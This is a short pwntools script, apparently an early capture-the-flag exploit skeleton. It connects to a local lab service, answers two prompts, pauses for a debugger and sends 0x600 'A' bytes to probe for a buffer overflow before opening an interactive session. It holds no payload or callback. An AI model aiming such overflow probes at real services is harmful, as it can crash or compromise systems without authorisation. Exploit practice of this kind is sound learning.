from pwn import *

HOST = ""
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)
s.recvuntil('?')
s.sendline('1')
s.recvuntil(':')
s.sendline('1234')
s.recvuntil(':')
raw_input()
s.sendline("A"*0x600)
s.interactive()

